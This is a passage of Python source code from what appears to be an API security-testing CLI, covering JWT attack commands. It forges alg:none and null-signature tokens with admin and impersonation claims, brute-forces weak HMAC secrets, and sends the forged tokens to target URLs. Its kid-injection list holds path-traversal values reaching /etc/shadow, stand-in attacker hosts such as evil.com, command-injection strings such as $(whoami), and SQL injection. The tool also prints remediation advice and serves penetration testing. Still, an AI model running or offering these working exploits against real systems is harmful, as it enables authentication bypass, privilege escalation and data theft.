      python apileaks.py jwt encode '{"sub":"admin"}' --secret mysecret
    """
    try:
        # Parse JSON strings
        try:
            header_dict = json.loads(header)
        except json.JSONDecodeError:
            click.echo("❌ Error: Header must be valid JSON", err=True)
            sys.exit(1)
        
        try:
            payload_dict = json.loads(payload)
        except json.JSONDecodeError:
            click.echo("❌ Error: Payload must be valid JSON", err=True)
            sys.exit(1)
        
        # Encode JWT
        token = encode_jwt(header_dict, payload_dict, secret)
        
        click.echo("\n" + "="*60)
        click.echo("JWT Token Generated")
        click.echo("="*60)
        click.echo(f"\n🔑 Secret Used: {secret}")
        click.echo(f"📋 Header: {json.dumps(header_dict)}")
        click.echo(f"🔐 Payload: {json.dumps(payload_dict)}")
        click.echo(f"\n🎫 Generated Token:")
        click.echo("-" * 20)
        click.echo(token)
        click.echo("\n" + "="*60)
        
    except ValueError as e:
        click.echo(f"❌ Error encoding JWT: {e}", err=True)
        sys.exit(1)
    except Exception as e:
        click.echo(f"❌ Unexpected error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-alg-none')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test alg:none attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_alg_none(ctx, token, payload, url, header, data, timeout):
    """Test algorithm confusion attack with alg:none
    
    \b
    🧪 CRITICAL SEVERITY ATTACK
    Algorithm confusion - completely nullifies authentication by:
    
    1️⃣ Rewriting header: "alg": "none"\b
    2️⃣ Removing signature completely\b
    3️⃣ Inserting malicious payload\b
    4️⃣ Sending unsigned token\b
    5️⃣ Testing privileged access

    
    \b
    Examples:
      # Basic alg:none test
      python apileaks.py jwt test-alg-none TOKEN
      
      # Test with custom admin payload
      python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'
      
      # Test against real endpoint
      python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
    """
    try:
        click.echo("🔍 Algorithm Confusion Attack (alg:none)")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Authentication Completely Nullified")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # 1️⃣ & 2️⃣ Create alg:none version with no signature
        click.echo("1️⃣ Rewriting header algorithm to 'none'...")
        new_header = {"alg": "none", "typ": "JWT"}
        
        # 3️⃣ Create malicious payloads
        click.echo("3️⃣ Creating malicious payloads...")
        
        attack_payloads = []
        
        # Use custom payload if provided
        if payload:
            try:
                custom_payload = json.loads(payload)
                attack_payloads.append(("Custom Payload", custom_payload))
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
        
        # Create privilege escalation payloads
        original_payload = copy.deepcopy(decoded['payload'])
        
        # Admin privilege escalation
        admin_payload = copy.deepcopy(original_payload)
        admin_payload.update({
            'sub': 'admin',
            'role': 'admin', 
            'admin': True,
            'is_admin': True,
            'scope': 'admin read write delete',
            'privileges': ['admin', 'superuser']
        })
        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
        
        # User impersonation
        if 'sub' in original_payload and original_payload['sub'] != 'admin':
            impersonation_payload = copy.deepcopy(original_payload)
            impersonation_payload['sub'] = 'admin'
            impersonation_payload['username'] = 'admin'
            impersonation_payload['user_id'] = '1'
            attack_payloads.append(("User Impersonation", impersonation_payload))
        
        # Extended expiration
        if 'exp' in original_payload:
            import time
            extended_payload = copy.deepcopy(original_payload)
            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
            attack_payloads.append(("Extended Expiration", extended_payload))
        
        # Generate attack tokens
        attack_tokens = []
        import base64
        
        for attack_name, attack_payload in attack_payloads:
            # 4️⃣ Create unsigned token (alg:none)
            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
            
            # alg:none tokens should have empty signature
            unsigned_token = f"{header_b64}.{payload_b64}."
            attack_tokens.append((attack_name, unsigned_token, attack_payload))
            
            click.echo(f"✅ Generated {attack_name} token")
        
        # Display generated tokens
        click.echo(f"\n🎯 Generated alg:none Attack Tokens:")
        click.echo("-" * 50)
        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
            click.echo(f"\n{i}. {name}:")
            click.echo(f"   Token: {token_val}")
            click.echo(f"   Payload: {json.dumps(payload_info)}")
        
        # 5️⃣ Test against real endpoint if URL provided
        if url and attack_tokens:
            click.echo(f"\n5️⃣ Testing privileged access against real endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, payload_info):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name} Test:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
                            success_indicators.append("Privileged Content Detected")
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
                            success_indicators.append("No Error Messages")
                        
                        if success_indicators:
                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Server accepted unsigned token!")
                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
                        else:
                            click.echo(f"   ✅ Attack blocked - server properly rejects alg:none")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, payload_info in attack_tokens:
                    await test_endpoint(token_name, token_value, payload_info)
            
            asyncio.run(run_all_tests())
        
        else:
            click.echo(f"\n⚠️  Manual Testing Required:")
            click.echo("• Test each token against your API endpoints")
            click.echo("• If ANY token is accepted, the server is CRITICALLY vulnerable")
            click.echo("• Proper JWT libraries should REJECT all alg:none tokens")
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Configure JWT library to REJECT alg:none tokens")
        click.echo("• Implement algorithm whitelist (e.g., only allow HS256, RS256)")
        click.echo("• Never trust the algorithm specified in JWT header")
        click.echo("• Use proper JWT validation libraries, not custom implementations")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-null-signature')
@click.argument('token')
@click.option('--payload', help='Custom payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test null signature attack against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_null_signature(ctx, token, payload, url, header, data, timeout):
    """Test null signature vulnerability
    
    \b
    🧾 CRITICAL SEVERITY ATTACK
    Null/empty signature acceptance - cryptographic validation bypass by:
    
    1️⃣ Sending JWT with empty signature: header.payload.\b
    2️⃣ Inserting admin payload\b
    3️⃣ Testing against protected endpoint\b
    4️⃣ Confirming bypass of signature validation
    
    \b
    Examples:
      # Basic null signature test
      python apileaks.py jwt test-null-signature TOKEN
      
      # Test with custom admin payload
      python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'
      
      # Test against real endpoint
      python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Null Signature Vulnerability Test")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: CRITICAL - Cryptographic Validation Bypass")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # 2️⃣ Create malicious payloads
        click.echo("2️⃣ Creating malicious payloads...")
        
        attack_payloads = []
        
        # Use custom payload if provided
        if payload:
            try:
                custom_payload = json.loads(payload)
                attack_payloads.append(("Custom Payload", custom_payload))
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
        
        # Create privilege escalation payloads
        original_payload = copy.deepcopy(decoded['payload'])
        
        # Admin privilege escalation
        admin_payload = copy.deepcopy(original_payload)
        admin_payload.update({
            'sub': 'admin',
            'role': 'admin', 
            'admin': True,
            'is_admin': True,
            'scope': 'admin read write delete',
            'privileges': ['admin', 'superuser']
        })
        attack_payloads.append(("Admin Privilege Escalation", admin_payload))
        
        # User impersonation
        if 'sub' in original_payload and original_payload['sub'] != 'admin':
            impersonation_payload = copy.deepcopy(original_payload)
            impersonation_payload['sub'] = 'admin'
            impersonation_payload['username'] = 'admin'
            impersonation_payload['user_id'] = '1'
            attack_payloads.append(("User Impersonation", impersonation_payload))
        
        # Extended expiration
        if 'exp' in original_payload:
            import time
            extended_payload = copy.deepcopy(original_payload)
            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
            attack_payloads.append(("Extended Expiration", extended_payload))
        
        # 1️⃣ Create tokens with different null signature variations
        click.echo("1️⃣ Creating null signature variants...")
        
        attack_tokens = []
        import base64
        
        for attack_name, attack_payload in attack_payloads:
            header_b64 = base64.urlsafe_b64encode(json.dumps(decoded['header']).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
            
            # Create different null signature variations
            variations = [
                (f"{attack_name} - Empty Signature", f"{header_b64}.{payload_b64}."),
                (f"{attack_name} - No Signature Section", f"{header_b64}.{payload_b64}"),
                (f"{attack_name} - Literal Null", f"{header_b64}.{payload_b64}.null"),
                (f"{attack_name} - Empty Object", f"{header_b64}.{payload_b64}." + "{}"),
                (f"{attack_name} - Zero Signature", f"{header_b64}.{payload_b64}.0"),
            ]
            
            for variant_name, variant_token in variations:
                attack_tokens.append((variant_name, variant_token, attack_payload))
        
        click.echo(f"✅ Generated {len(attack_tokens)} null signature variants")
        
        # Display generated tokens
        click.echo(f"\n🎯 Generated Null Signature Attack Tokens:")
        click.echo("-" * 55)
        for i, (name, token_val, payload_info) in enumerate(attack_tokens, 1):
            click.echo(f"\n{i}. {name}")
            click.echo(f"   Token: {token_val}")
        
        # 3️⃣ & 4️⃣ Test against real endpoint if URL provided
        if url and attack_tokens:
            click.echo(f"\n3️⃣ Testing against protected endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, payload_info):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name}:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
                            success_indicators.append("Privileged Content Detected")
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
                            success_indicators.append("No Error Messages")
                        
                        if success_indicators:
                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Server accepted token with null signature!")
                            click.echo(f"   💀 Payload used: {json.dumps(payload_info)}")
                        else:
                            click.echo(f"   ✅ Attack blocked - server properly validates signatures")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, payload_info in attack_tokens:
                    await test_endpoint(token_name, token_value, payload_info)
            
            asyncio.run(run_all_tests())
        
        else:
            click.echo(f"\n⚠️  Manual Testing Required:")
            click.echo("• Test each variant against your API")
            click.echo("• If ANY variant is accepted, signature verification is bypassed")
            click.echo("• Proper implementation should reject ALL null signature variants")
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Attack variants generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Implement proper signature validation - never accept empty signatures")
        click.echo("• Validate signature length and format before verification")
        click.echo("• Use established JWT libraries with proper validation")
        click.echo("• Implement signature presence checks before cryptographic verification")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('brute-secret')
@click.argument('token')
@click.option('--wordlist', '-w', default='wordlists/jwt_secrets.txt', help='Wordlist file for secret brute-force')
@click.option('--max-attempts', default=1000, help='Maximum brute-force attempts')
@click.option('--url', '-u', help='Target URL to test recovered secret against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_brute_secret(ctx, token, wordlist, max_attempts, url, header, data, timeout):
    """Brute-force weak HMAC secrets and test exploitation
    
    \b
    🔐 CRITICAL SEVERITY ATTACK
    This attack attempts to crack JWT HMAC secrets and demonstrates
    complete authentication compromise by:
    
    1️⃣ Confirming JWT uses HS* algorithm\b
    2️⃣ Executing brute-force/dictionary attack\b
    3️⃣ Recovering the real secret\b
    4️⃣ Forging new JWT with modified claims\b
    5️⃣ Testing real API access with forged token\b

    
    \b
    Examples:
      # Basic secret brute-force
      python apileaks.py jwt brute-secret TOKEN
      
      # Test exploitation against real endpoint
      python apileaks.py jwt brute-secret TOKEN --url https://api.example.com/admin
      
      # Full exploitation test with custom headers
      python apileaks.py jwt brute-secret TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 JWT HMAC Secret Brute-Force Attack")
        click.echo("="*45)
        click.echo("🔥 SEVERITY: CRITICAL - Complete Authentication Compromise")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Check if wordlist exists
        if not Path(wordlist).exists():
            click.echo(f"❌ Wordlist not found: {wordlist}")
            click.echo("Creating default wordlist...")
            
            # Create default wordlist
            Path(wordlist).parent.mkdir(exist_ok=True)
            default_secrets = [
                "secret", "password", "123456", "admin", "jwt_secret",
                "your_secret_key", "mysecret", "key", "token", "auth",
                "api_key", "private_key", "hmac_secret", "signing_key",
                "jwt_key", "access_token", "refresh_token", "session_key",
                "", "null", "undefined", "test", "dev", "development",
                "prod", "production", "staging", "demo", "example"
            ]
            
            with open(wordlist, 'w') as f:
                for secret in default_secrets:
                    f.write(f"{secret}\n")
            
            click.echo(f"✅ Created default wordlist: {wordlist}")
        
        # Load secrets from wordlist
        with open(wordlist, 'r') as f:
            secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        # Decode token to get header and payload
        decoded = decode_jwt(token)
        
        # 1️⃣ Confirm JWT uses HS* algorithm
        algorithm = decoded['header'].get('alg', '').upper()
        if not algorithm.startswith('HS'):
            click.echo(f"⚠️  WARNING: Token uses {algorithm} algorithm, not HMAC")
            click.echo("   This attack only works against HS256, HS384, HS512")
            if not click.confirm("Continue anyway?"):
                return
        
        click.echo(f"✅ Target algorithm: {algorithm}")
        click.echo(f"📋 Testing {min(len(secrets), max_attempts)} secrets...")
        click.echo("")
        
        # 2️⃣ & 3️⃣ Execute brute-force and recover secret
        found_secret = None
        for i, secret in enumerate(secrets[:max_attempts]):
            if i % 50 == 0 and i > 0:
                click.echo(f"🔄 Progress: {i}/{min(len(secrets), max_attempts)} ({(i/min(len(secrets), max_attempts)*100):.1f}%)")
            
            try:
                # Try to verify token with this secret
                test_token = encode_jwt(decoded['header'], decoded['payload'], secret)
                if test_token == token:
                    found_secret = secret
                    break
            except:
                continue
        
        if not found_secret:
            click.echo(f"\n❌ Secret not found in wordlist")
            click.echo(f"💡 Try a larger wordlist or the secret may be strong")
            return
        
        # 🎉 SECRET RECOVERED!
        click.echo(f"\n" + "="*60)
        click.echo("🎉 SUCCESS! HMAC SECRET RECOVERED!")
        click.echo("="*60)
        click.echo(f"🔑 Secret: '{found_secret}'")
        click.echo(f"⚠️  This JWT uses a weak secret that can be brute-forced!")
        click.echo("")
        
        # 4️⃣ Forge new JWT with modified claims
        click.echo("4️⃣ Forging malicious JWT tokens...")
        
        # Create privilege escalation payloads
        attack_payloads = []
        
        # Original payload as baseline
        original_payload = copy.deepcopy(decoded['payload'])
        
        # Privilege escalation attacks
        escalation_payload = copy.deepcopy(original_payload)
        escalation_payload.update({
            'role': 'admin',
            'scope': 'admin read write delete',
            'admin': True,
            'is_admin': True,
            'privileges': ['admin', 'superuser', 'root']
        })
        attack_payloads.append(("Privilege Escalation", escalation_payload))
        
        # User impersonation
        if 'sub' in original_payload:
            impersonation_payload = copy.deepcopy(original_payload)
            impersonation_payload['sub'] = 'admin'
            impersonation_payload['username'] = 'admin'
            impersonation_payload['user_id'] = '1'
            attack_payloads.append(("User Impersonation", impersonation_payload))
        
        # Expiration bypass
        if 'exp' in original_payload:
            import time
            extended_payload = copy.deepcopy(original_payload)
            extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
            attack_payloads.append(("Expiration Extension", extended_payload))
        
        # Generate attack tokens
        attack_tokens = []
        for attack_name, attack_payload in attack_payloads:
            try:
                attack_token = encode_jwt(decoded['header'], attack_payload, found_secret)
                attack_tokens.append((attack_name, attack_token, attack_payload))
                click.echo(f"✅ Generated {attack_name} token")
            except Exception as e:
                click.echo(f"❌ Failed to generate {attack_name} token: {e}")
        
        # 5️⃣ Test real API access if URL provided
        if url and attack_tokens:
            click.echo(f"\n5️⃣ Testing exploitation against real endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, payload_info):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name} Test:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'authorized']):
                            success_indicators.append("Privileged Content Detected")
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text:
                            success_indicators.append("No Error Messages")
                        
                        if success_indicators:
                            click.echo(f"   🚨 POTENTIAL VULNERABILITY: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Payload used: {json.dumps(payload_info, indent=2)}")
                        else:
                            click.echo(f"   ✅ Attack blocked or unsuccessful")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, payload_info in attack_tokens:
                    await test_endpoint(token_name, token_value, payload_info)
            
            asyncio.run(run_all_tests())
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Secret recovered: '{found_secret}'")
        click.echo(f"✅ Attack tokens generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Use a strong, randomly generated HMAC secret (32+ characters)")
        click.echo("• Consider switching to RS256 (asymmetric) algorithm")
        click.echo("• Implement proper secret rotation policies")
        click.echo("• Never use default or common secrets")
        
        if found_secret in ["secret", "password", "123456", ""]:
            click.echo(f"\n🚨 CRITICAL: Using extremely weak secret '{found_secret}'!")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-kid-injection')
@click.argument('token')
@click.option('--kid-payload', default='../../etc/passwd', help='Kid injection payload')
@click.option('--payload', help='Custom JWT payload to inject (JSON format)')
@click.option('--url', '-u', help='Target URL to test kid injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_kid_injection(ctx, token, kid_payload, payload, url, header, data, timeout):
    """Test Key ID (kid) injection vulnerability
    
    \b
    🗝️ HIGH → CRITICAL SEVERITY ATTACK
    Key ID (kid) injection - depends on backend implementation:
    
    1️⃣ Injecting malicious kid parameter
    2️⃣ Testing local file paths: "kid": "../../etc/passwd"
    3️⃣ Testing remote URLs: "kid": "http://attacker/key.pem"
    4️⃣ Signing token with controlled key
    5️⃣ Testing real API access
    
    \b
    🧪 Expected Exploitation:
    • File disclosure (path traversal)
    • Validation with arbitrary keys
    • Remote key fetching from attacker server
    • Potential RCE in vulnerable parsers
    
    \b
    Examples:
      # Basic kid injection test
      python apileaks.py jwt test-kid-injection TOKEN
      
      # Test with custom kid payload
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"
      
      # Test with custom JWT payload
      python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'
      
      # Test against real endpoint with both custom payloads
      python apileaks.py jwt test-kid-injection TOKEN --kid-payload "../../etc/passwd" --payload '{"admin":true}' --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 Key ID (kid) Injection Attack")
        click.echo("="*40)
        click.echo("🔥 SEVERITY: HIGH → CRITICAL (depends on backend)")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # 1️⃣ Create malicious kid injection payloads
        click.echo("1️⃣ Creating kid injection payloads...")
        
        # Determine JWT payload to use
        jwt_payloads = []
        
        # Use custom payload if provided
        if payload:
            try:
                custom_payload = json.loads(payload)
                jwt_payloads.append(("Custom JWT Payload", custom_payload))
            except json.JSONDecodeError:
                click.echo(f"❌ Invalid JSON payload: {payload}")
                return
        else:
            # Create privilege escalation payloads automatically
            original_payload = copy.deepcopy(decoded['payload'])
            
            # Admin privilege escalation
            admin_payload = copy.deepcopy(original_payload)
            admin_payload.update({
                'sub': 'admin',
                'role': 'admin', 
                'admin': True,
                'is_admin': True,
                'scope': 'admin read write delete',
                'privileges': ['admin', 'superuser']
            })
            jwt_payloads.append(("Admin Privilege Escalation", admin_payload))
            
            # User impersonation
            if 'sub' in original_payload and original_payload['sub'] != 'admin':
                impersonation_payload = copy.deepcopy(original_payload)
                impersonation_payload['sub'] = 'admin'
                impersonation_payload['username'] = 'admin'
                impersonation_payload['user_id'] = '1'
                jwt_payloads.append(("User Impersonation", impersonation_payload))
            
            # Extended expiration
            if 'exp' in original_payload:
                import time
                extended_payload = copy.deepcopy(original_payload)
                extended_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60)  # 1 year
                jwt_payloads.append(("Extended Expiration", extended_payload))
            
            # If no special payloads were created, use original
            if not jwt_payloads:
                jwt_payloads.append(("Original Payload", original_payload))
        
        # 2️⃣ & 3️⃣ Path traversal and URL injection payloads
        injection_payloads = [
            # Custom payload first
            ("Custom Kid", kid_payload),
            
            # Path traversal attacks
            ("Linux passwd", "../../etc/passwd"),
            ("Linux shadow", "../../../etc/shadow"), 
            ("Windows hosts", "../../windows/system32/drivers/etc/hosts"),
            ("Absolute path", "/etc/passwd"),
            ("Null byte", "../../etc/passwd\x00"),
            ("URL encoded", "..%2F..%2Fetc%2Fpasswd"),
            
            # Remote URL attacks
            ("HTTP URL", "http://attacker.com/key.pem"),
            ("HTTPS URL", "https://evil.com/malicious.key"),
            ("FTP URL", "ftp://attacker.com/key.pem"),
            ("File URL", "file:///etc/passwd"),
            
            # Command injection attempts
            ("Command injection 1", "key'; whoami; #"),
            ("Command injection 2", "$(whoami)"),
            ("Command injection 3", "`whoami`"),
            ("Command injection 4", "||whoami||"),
            ("Command injection 5", "/dev/null; whoami #"),
            
            # SQL injection attempts
            ("SQL injection 1", "'; DROP TABLE users; --"),
            ("SQL injection 2", "' OR '1'='1"),
            ("SQL injection 3", "' UNION SELECT * FROM users --"),
        ]
        
        # Generate attack tokens (combine kid payloads with JWT payloads)
        attack_tokens = []
        import base64
        
        for jwt_payload_name, jwt_payload_data in jwt_payloads:
            for kid_attack_name, kid_payload_data in injection_payloads:
                # Modify header with kid injection
                new_header = copy.deepcopy(decoded['header'])
                new_header['kid'] = kid_payload_data
                
                # Create new token
                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(jwt_payload_data).encode()).decode().rstrip('=')
                
                # For path traversal, keep original signature (might work if key is found)
                # For command/SQL injection, remove signature (likely to fail validation anyway)
                if any(x in kid_payload_data for x in ['../', '/etc/', 'windows', 'http://', 'https://', 'ftp://', 'file://']):
                    # Path traversal and URL - keep signature
                    injected_token = f"{header_b64}.{payload_b64}.{decoded['signature']}"
                else:
                    # Command/SQL injection - remove signature
                    injected_token = f"{header_b64}.{payload_b64}."
                
                combined_name = f"{jwt_payload_name} + {kid_attack_name}"
                attack_tokens.append((combined_name, injected_token, kid_payload_data, jwt_payload_data))
            
        click.echo(f"✅ Generated {len(attack_tokens)} kid injection variants")
        
        # Display generated tokens
        click.echo(f"\n🎯 Generated Kid Injection Attack Tokens:")
        click.echo("-" * 50)
        for i, (name, token_val, kid_payload_info, jwt_payload_info) in enumerate(attack_tokens, 1):
            click.echo(f"\n{i}. {name}:")
            click.echo(f"   Kid: {kid_payload_info}")
            click.echo(f"   JWT Payload: {json.dumps(jwt_payload_info)}")
            click.echo(f"   Token: {token_val}")
        
        # 4️⃣ & 5️⃣ Test against real endpoint if URL provided
        if url and attack_tokens:
            click.echo(f"\n4️⃣ Testing kid injection against real endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, kid_payload, jwt_payload):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name}:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        vulnerability_type = "Unknown"
                        
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        
                        # Check for file disclosure
                        if any(indicator in response_text for indicator in ['root:', 'bin/bash', 'daemon:', 'nobody:']):
                            success_indicators.append("File Disclosure Detected (/etc/passwd)")
                            vulnerability_type = "File Disclosure"
                        
                        # Check for privileged access
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged']):
                            success_indicators.append("Privileged Content Detected")
                            vulnerability_type = "Authentication Bypass"
                        
                        # Check for command execution
                        if any(indicator in response_text for indicator in ['uid=', 'gid=', 'groups=']):
                            success_indicators.append("Command Execution Detected")
                            vulnerability_type = "Remote Code Execution"
                        
                        # Check for error messages that might indicate processing
                        if any(indicator in response_text for indicator in ['file not found', 'permission denied', 'no such file']):
                            success_indicators.append("File System Access Attempted")
                            vulnerability_type = "Path Traversal"
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
                            success_indicators.append("No Error Messages")
                        
